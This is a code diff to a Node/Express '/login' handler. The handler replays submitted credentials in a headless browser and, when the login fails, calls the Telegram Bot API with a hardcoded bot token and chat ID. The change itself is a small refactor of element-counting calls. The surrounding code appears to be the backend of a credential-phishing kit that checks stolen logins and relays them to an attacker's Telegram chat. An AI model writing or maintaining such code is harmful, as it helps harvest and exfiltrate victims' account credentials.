@@ -62,7 +62,8 @@ app.post("/login", async (req, res) => {
 
     await new Promise((resolve) => setTimeout(resolve, 5000));
 
-    const loginError = await page.locator(".errors").count();
+    const loginError = await page.$$eval(".errors", (elements) => elements.length);
+
     if (loginError > 0) {
       await browser.close();
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
@@ -79,7 +80,8 @@ app.post("/login", async (req, res) => {
       return res.json({ success: false, message: "Invalid credentials" });
     }
 
-    const isLoggedIn = (await page.locator("#pad").count()) > 0;
+    const isLoggedIn = (await page.$$eval("#pad", (elements) => elements.length)) > 0;
+
     if (!isLoggedIn) {
       await browser.close();
       return res.json({ success: false, message: "Login failed" });
